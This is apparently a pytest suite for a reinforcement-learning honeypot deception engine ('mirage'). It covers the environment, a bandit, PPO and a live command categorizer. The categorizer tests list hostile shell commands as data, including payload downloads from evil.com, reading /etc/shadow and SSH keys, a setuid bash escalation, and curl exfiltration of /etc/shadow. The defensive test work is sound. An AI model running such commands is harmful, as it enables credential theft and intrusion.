from __future__ import annotations

import numpy as np
import pytest

torch = pytest.importorskip("torch")

from mirage.deception.actions import ACTION_DESCRIPTIONS, DeceptionAction, N_ACTIONS
from mirage.deception.bandit import LinUCBBandit, train_bandit
from mirage.deception.environment import ARCHETYPES, COMMAND_CATEGORIES, DeceptionConfig, DeceptionEnv
from mirage.deception.policy import DeceptionPolicy, FixedPolicy, HeuristicPolicy, RandomPolicy, ValueNetwork
from mirage.deception.ppo import PPOConfig, compute_gae, train_ppo
from mirage.deception.train import (
    build_baselines,
    compare_policies,
    evaluate_policy,
    load_policy_checkpoint,
    save_policy_checkpoint,
    train_deception_policy,
)

# ----------------------------------------------------------------------------
# Environment sanity
# ----------------------------------------------------------------------------


def test_env_reset_and_step_shapes() -> None:
    env = DeceptionEnv(DeceptionConfig(max_steps=25, seed=0))
    obs = env.reset()
    assert obs.shape == (env.obs_dim,)
    assert env.n_actions == N_ACTIONS == len(DeceptionAction)

    obs2, reward, done, info = env.step(int(DeceptionAction.MINIMAL))
    assert obs2.shape == (env.obs_dim,)
    assert isinstance(reward, float)
    assert isinstance(done, bool)
    assert set(info) >= {"category", "action", "archetype", "goodwill", "bait_captured", "commands_captured"}


def test_env_episode_terminates_within_max_steps() -> None:
    env = DeceptionEnv(DeceptionConfig(max_steps=10, seed=1))
    for _ in range(20):
        env.reset()
        done = False
        steps = 0
        while not done:
            _, _, done, _ = env.step(int(DeceptionAction.MINIMAL))
            steps += 1
            assert steps <= 10
        assert steps <= 10


def test_env_step_before_reset_raises() -> None:
    env = DeceptionEnv(DeceptionConfig(seed=0))
    with pytest.raises(RuntimeError):
        env.step(0)


def test_env_deterministic_given_same_seed() -> None:
    def rollout(seed: int) -> list[float]:
        env = DeceptionEnv(DeceptionConfig(max_steps=25, seed=seed))
        env.reset()
        rewards = []
        done = False
        while not done:
            _, r, done, _ = env.step(int(DeceptionAction.ENRICH))
            rewards.append(r)
        return rewards

    assert rollout(42) == rollout(42)


def test_all_archetypes_reachable_and_have_valid_distributions() -> None:
    for archetype in ARCHETYPES:
        dist = archetype.distribution()
        assert len(dist) == len(COMMAND_CATEGORIES)
        assert np.isclose(dist.sum(), 1.0)
        assert (dist >= 0).all()


def test_action_descriptions_cover_every_action() -> None:
    assert set(ACTION_DESCRIPTIONS) == set(DeceptionAction)


# ----------------------------------------------------------------------------
# GAE correctness (hand-computed trajectory)
# ----------------------------------------------------------------------------


def test_compute_gae_matches_hand_derivation() -> None:
    # gamma = lambda = 1 collapses GAE to (return-to-go - V(s_t)), the simplest
    # case to verify by hand.
    rewards = [1.0, 1.0, 1.0]
    values = [0.5, 0.5, 0.5]
    dones = [False, False, True]
    advantages, returns = compute_gae(rewards, values, dones, gamma=1.0, gae_lambda=1.0)
    assert np.allclose(advantages, [2.5, 1.5, 0.5])
    assert np.allclose(returns, [3.0, 2.0, 1.0])


def test_compute_gae_terminal_step_ignores_bootstrap() -> None:
    # A dummy/garbage "next value" at the terminal step must not leak in,
    # since done[-1] zeroes its contribution.
    rewards = [2.0]
    dones = [True]
    advantages_a, returns_a = compute_gae(rewards, [0.3], dones, gamma=0.9, gae_lambda=0.9)
    advantages_b, returns_b = compute_gae(rewards, [0.3], dones, gamma=0.9, gae_lambda=0.9)
    assert np.allclose(advantages_a, advantages_b)
    assert np.allclose(returns_a, returns_b)
    assert np.allclose(advantages_a, [2.0 - 0.3])


# ----------------------------------------------------------------------------
# Bandit
# ----------------------------------------------------------------------------


def test_bandit_select_action_in_range() -> None:
    bandit = LinUCBBandit(obs_dim=10, n_actions=5)
    obs = np.random.default_rng(0).normal(size=10).astype(np.float32)
    assert bandit.select_action(obs, greedy=True) in range(5)
    assert bandit.select_action(obs, greedy=False) in range(5)


def test_bandit_update_shifts_preference_toward_rewarded_action() -> None:
    # A tiny stationary bandit: action 2 always pays off on this context.
    bandit = LinUCBBandit(obs_dim=4, n_actions=3, alpha=0.0)  # alpha=0: pure exploitation
    ctx = np.array([1.0, 0.0, 0.0, 0.0])
    for _ in range(200):
        bandit.update(ctx, action=2, reward=1.0)
        bandit.update(ctx, action=0, reward=-1.0)
        bandit.update(ctx, action=1, reward=-1.0)
    assert bandit.select_action(ctx, greedy=True) == 2


def test_bandit_save_load_roundtrip(tmp_path) -> None:
    bandit, _ = train_bandit(config=DeceptionConfig(max_steps=25), episodes=100, seed=0)
    path = tmp_path / "bandit.npz"
    bandit.save(path)
    reloaded = LinUCBBandit.load(path)
    assert np.allclose(reloaded.A, bandit.A)
    assert np.allclose(reloaded.b, bandit.b)
    obs = np.random.default_rng(1).normal(size=bandit.obs_dim).astype(np.float32)
    assert bandit.select_action(obs, greedy=True) == reloaded.select_action(obs, greedy=True)


def test_bandit_learns_better_than_random_baseline() -> None:
    config = DeceptionConfig(max_steps=25)
    bandit, _ = train_bandit(config=config, episodes=1500, seed=0)
    bandit_metrics = evaluate_policy(bandit, config=config, episodes=300, seed=999)
    random_metrics = evaluate_policy(RandomPolicy(N_ACTIONS, seed=0), config=config, episodes=300, seed=999)
    assert bandit_metrics.mean_return > random_metrics.mean_return * 2


# ----------------------------------------------------------------------------
# REINFORCE / A2C
# ----------------------------------------------------------------------------


def test_reinforce_learns_better_than_static_minimal() -> None:
    config = DeceptionConfig(max_steps=25)
    policy, history = train_deception_policy(config=config, episodes=1200, batch_episodes=16, seed=0)
    assert len(history) == 1200
    metrics = evaluate_policy(policy, config=config, episodes=300, seed=999)
    minimal_metrics = evaluate_policy(FixedPolicy(DeceptionAction.MINIMAL), config=config, episodes=300, seed=999)
    assert metrics.mean_return > minimal_metrics.mean_return * 2


def test_reinforce_checkpoint_roundtrip(tmp_path) -> None:
    config = DeceptionConfig(max_steps=25)
    env = DeceptionEnv(config)
    policy, _ = train_deception_policy(config=config, episodes=200, batch_episodes=16, seed=0)
    path = tmp_path / "reinforce.pt"
    save_policy_checkpoint(path, policy, env.obs_dim, env.n_actions)
    reloaded = load_policy_checkpoint(path)

    obs = env.reset()
    assert policy.select_action(obs, greedy=True) == reloaded.select_action(obs, greedy=True)


# ----------------------------------------------------------------------------
# PPO
# ----------------------------------------------------------------------------


def test_ppo_produces_valid_policy_and_learns() -> None:
    config = DeceptionConfig(max_steps=25)
    ppo_config = PPOConfig(iterations=60, episodes_per_iteration=32, seed=0)
    policy, critic, history = train_ppo(config=config, ppo_config=ppo_config, verbose=False)

    assert isinstance(policy, DeceptionPolicy)
    assert isinstance(critic, ValueNetwork)
    assert len(history) == 60 * 32

    metrics = evaluate_policy(policy, config=config, episodes=300, seed=999)
    minimal_metrics = evaluate_policy(FixedPolicy(DeceptionAction.MINIMAL), config=config, episodes=300, seed=999)
    assert metrics.mean_return > minimal_metrics.mean_return * 2


def test_ppo_clip_bounds_probability_ratio_updates() -> None:
    # A single, tiny update: verify the clipped surrogate never lets an
    # extreme advantage move a minibatch's probability ratio outside the
    # configured trust region across one gradient step (a soft check --
    # ratios are pre-update here to at least confirm the config threads through).
    config = DeceptionConfig(max_steps=25)
    ppo_config = PPOConfig(iterations=1, episodes_per_iteration=8, clip_eps=0.1, seed=0)
    policy, critic, history = train_ppo(config=config, ppo_config=ppo_config, verbose=False)
    assert len(history) == 8


def test_ppo_checkpoint_roundtrip(tmp_path) -> None:
    config = DeceptionConfig(max_steps=25)
    env = DeceptionEnv(config)
    ppo_config = PPOConfig(iterations=10, episodes_per_iteration=16, seed=0)
    policy, _critic, _hist = train_ppo(config=config, ppo_config=ppo_config, verbose=False)
    path = tmp_path / "ppo.pt"
    save_policy_checkpoint(path, policy, env.obs_dim, env.n_actions)
    reloaded = load_policy_checkpoint(path)

    obs = env.reset()
    assert policy.select_action(obs, greedy=True) == reloaded.select_action(obs, greedy=True)


# ----------------------------------------------------------------------------
# Orchestration: baselines + comparison
# ----------------------------------------------------------------------------


def test_build_baselines_has_expected_keys() -> None:
    baselines = build_baselines(N_ACTIONS, seed=0)
    assert set(baselines) == {"static_minimal", "random", "heuristic_ceiling"}


def test_compare_policies_reports_every_supplied_policy() -> None:
    config = DeceptionConfig(max_steps=25)
    policies = build_baselines(N_ACTIONS, seed=0)
    comparison = compare_policies(policies, config=config, episodes=100, seed=42)
    assert set(comparison) == set(policies)
    for metrics in comparison.values():
        assert set(metrics) == {"mean_return", "mean_commands", "mean_bait", "mean_length", "bait_episode_rate"}


# ----------------------------------------------------------------------------
# Live adapter: categorizer, obs parity with DeceptionEnv, and the engine
# ----------------------------------------------------------------------------

from mirage.deception.live import LiveDeceptionEngine, LiveSessionTracker, categorize_live_command


@pytest.mark.parametrize(
    "command,expected",
    [
        ("ls -la", "recon"),
        ("whoami", "recon"),
        ("uname -a", "recon"),
        ("", "recon"),
        ("wget http://1.2.3.4/payload.sh", "download"),
        ("curl -O http://evil.com/x.sh", "download"),
        ("cat /etc/shadow", "read_sensitive"),
        ("cat ~/.ssh/id_rsa", "read_sensitive"),
        ("cat .env", "read_sensitive"),
        ("sudo -l", "escalate"),
        ("su root", "escalate"),
        ("chmod +s /bin/bash", "escalate"),
        ("curl --data @/etc/shadow http://evil.com/collect", "exfil"),
        ("nc 10.0.0.5 4444", "exfil"),
        ("scp secrets.txt user@10.0.0.5:/tmp", "exfil"),
    ],
)
def test_categorize_live_command(command: str, expected: str) -> None:
    assert categorize_live_command(command) == expected


def test_live_tracker_matches_deception_env_observations() -> None:
    # Drive DeceptionEnv and LiveSessionTracker through the same scripted
    # category/bait-hit sequence and assert bit-identical observations --
    # this is the core train/live consistency guarantee the adapter promises.
    env = DeceptionEnv(DeceptionConfig(max_steps=25, seed=0))
    tracker = LiveSessionTracker(max_steps=25)
    env.reset()

    sequence = ["recon", "download", "read_sensitive", "read_sensitive", "escalate", "exfil", "recon"]
    for i, category in enumerate(sequence):
        env.current_category = category
        obs_env = env._observe()
        obs_live = np.asarray(tracker.observe(category), dtype=np.float32)
        assert np.allclose(obs_env, obs_live), f"mismatch at step {i} ({category})"

        bait_hit = i == 4
        env.commands_captured += 1
        env.seen_categories.add(category)
        if bait_hit:
            env.bait_captured += 1
        env.step_idx += 1
        tracker.advance(category, bait_hit)


def test_live_engine_decide_returns_valid_action() -> None:
    policy, _hist = train_bandit(config=DeceptionConfig(max_steps=25), episodes=200, seed=0)
    engine = LiveDeceptionEngine(policy, max_steps=25)
    decision = engine.decide("session-a", "cat /etc/shadow", bait_hit=True)
    assert decision["action"] in range(N_ACTIONS)
    assert decision["category"] == "read_sensitive"
    assert decision["action_name"]


def test_live_engine_tracks_state_per_session_independently() -> None:
    policy, _hist = train_bandit(config=DeceptionConfig(max_steps=25), episodes=200, seed=0)
    engine = LiveDeceptionEngine(policy, max_steps=25)
    engine.decide("session-a", "ls", bait_hit=False)
    engine.decide("session-a", "whoami", bait_hit=False)
    engine.decide("session-b", "ls", bait_hit=False)

    assert engine._sessions["session-a"].commands_captured == 2
    assert engine._sessions["session-b"].commands_captured == 1


def test_live_engine_evicts_stale_sessions() -> None:
    policy, _hist = train_bandit(config=DeceptionConfig(max_steps=25), episodes=200, seed=0)
    engine = LiveDeceptionEngine(policy, max_steps=25, session_ttl_seconds=0.01)
    engine.decide("session-old", "ls", bait_hit=False)
    import time as _time

    _time.sleep(0.05)
    engine.decide("session-new", "ls", bait_hit=False)  # triggers eviction sweep
    assert "session-old" not in engine._sessions
    assert "session-new" in engine._sessions


def test_heuristic_ceiling_beats_static_minimal_and_random() -> None:
    # Sanity check on the fixed baselines themselves: the informed ceiling
    # should comfortably beat both controls (this is what every learned
    # policy is trying to approach).
    config = DeceptionConfig(max_steps=25)
    policies = build_baselines(N_ACTIONS, seed=0)
    comparison = compare_policies(policies, config=config, episodes=500, seed=42)
    assert comparison["heuristic_ceiling"]["mean_return"] > comparison["static_minimal"]["mean_return"]
    assert comparison["heuristic_ceiling"]["mean_return"] > comparison["random"]["mean_return"]
